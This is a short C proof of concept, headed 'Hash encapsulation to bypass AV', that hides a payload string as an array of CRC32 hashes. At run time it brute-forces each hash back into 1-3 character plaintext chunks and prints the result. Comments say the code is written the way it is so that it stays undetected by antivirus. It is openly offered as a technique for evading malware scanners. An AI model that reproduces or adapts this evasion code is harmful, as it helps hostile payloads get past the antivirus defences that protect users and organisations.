/*
	Author: DiabloHorn http://diablohorn.wordpress.com
	Hash encapsulation to bypass AV
*/

#include <stdio.h>
#include <string.h>
#include <stdlib.h>


//http://stackoverflow.com/questions/5162784/uint32-t-identifier-not-found-error
typedef __int32 int32_t;
typedef unsigned __int32 uint32_t;
typedef unsigned __int8 uint8_t;

uint32_t crc_table[256];

void make_crc_table(void);
uint32_t crc32(uint8_t *buf, size_t len);
void getplain(uint32_t target,char *result);

void main(void){
	char *temp = (char *)malloc(1024);
	int i,psize;

	uint32_t hashes[] = {4152682635,2930860581,2930860581,2930860581,2930860581,2930860581,4135321336,919810150,1298182231,3894999574,2065113539,2837362196,2184439255,2176266681,702991012,2243508831,1209968001,3975017512,2582102499,695610215,1760147734,6765230,1111412722,1891979203,2218836778,224207615,3802209811,2213940721,2713825083,2677151151,873917617,2376591207,4057824061,819873513,3076604605,3832294985,2136629152,1471088737,3293189638,2580893500,2278556185,2203993409,98398086,2922013324,3015020677,139157759,2111043536,2198569222,2155974368,2260278132,3486471351,376580435,3104443926,1566664133,2455401033,814911529,2284173440,1247982675,437588446,3494813349,2229926714,522873625,770683185,1638119265,1313311207,2941669314,1254816995,1627167016,3742443462,1235994205,3623353174,3148509359,1929893137,1471088737,4056639811,3138795672,4288037577,1840647000,2502474163,3244524720,3597089081,3412009157,4053759605,3974602294,747768508,2921170612,1794418512,4253012361,1234237091,2779481201,2948901113,1070395963,1211680215,2598175530,3596415944,1351943850,2168088426,1092818336,1106709402,2155577350,1289874401,2654330358,2476550897,3240120126,1325880217,613133889,2288931418,3220931790,2817357377,1852367239,2610883336,980325681,3021644503,3079397629,3445414940,2135198514,1317679847,3986177780,4032705138,3705819538,2371136943,1142510981,1530295699,2473689103,83666907,2863345964,1601553529,3262895037,2086340166,1739589904,2297978180,4066313297,999103642,4167797021,555491901,2674603385,545163839,319238029,810508780,780718831,108222224,3129528177,1831666588,1818280532,681666847,62346129,3678884278,660215225,2243100740,3561699392,914662151,1524199574,912161497,3744132332,4131912305,2912202511,2548754293,2135290879,4007229603,2062552100,2046445329,969995107,1850509097,3660734821,1576051875,3169537351,1248131305,2434313619,1862615313,3822026592,3167199596,1926018913,704824217,1232421312,1015560499,2406267275,219177767,3827660246,2602236405,4093656293,2354554974,2016516970,2943242508,997835161,426930103,357856322,3965188296,1852890056,2693026763,228784373,1747210148,933499799,3934866399,2495813921,1428334561,1012289696,2076056019,3985357922,3181860862,2928433765,2545133098,3200396980,3396287731,1902762272,420270096,736345971,2558254844,1151908308,3335593029,1768429743,1152809116,3554254475};	
	
	memset(temp,0,1024);
	make_crc_table();
	
	psize = sizeof(hashes)/sizeof(uint32_t);
	for(i=0;i<psize;i++){
		getplain(hashes[i],temp);
	}
	printf("%s",temp);
	free(temp);
}

/* bruteforce crc32 hashes, return plaintext*/
void getplain(uint32_t target,char *result){
	char s[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
	char data[4];
	int i,j,k;

	memset(data,0,4);
	/*
		Didn't use recursive function on purpose.
		The more code we have now, the easier it will hopefully be to make this
		undetected in the future.
	*/
	for(i=0;i<62;i++) {
		data[0] = s[i];
		if(target == crc32(&data[0],strlen(data))){
			strcat_s(result,1023,data);
		}
		memset(data,0,4);
		for(j=0;j<62;j++) {
			data[0] = s[i];
			data[1] = s[j];
			if(target == crc32(&data[0],strlen(data))){
				strcat_s(result,1023,data);
			}
			memset(data,0,4);
			for(k=0;k<62;k++) {
				data[0] = s[i];
				data[1] = s[j];
				data[2] = s[k];
				if(target == crc32(&data[0],strlen(data))){
					strcat_s(result,1023,data);
				}
				memset(data,0,4);
			}
		}
	}
}

/* Thanks wikipedia for the source */
/* Run this function previously */
void make_crc_table(void) {
	uint32_t i;
	int j;
    for (i = 0; i < 256; i++) {
        uint32_t c = i;
        for (j = 0; j < 8; j++) {
            c = (c & 1) ? (0xEDB88320 ^ (c >> 1)) : (c >> 1);
        }
        crc_table[i] = c;
    }
}

/* Thanks wikipedia for the source */
uint32_t crc32(uint8_t *buf, size_t len) {
    uint32_t c = 0xFFFFFFFF;
	size_t i;
    for (i = 0; i < len; i++) {
        c = crc_table[(c ^ buf[i]) & 0xFF] ^ (c >> 8);
    }
    return c ^ 0xFFFFFFFF;
}
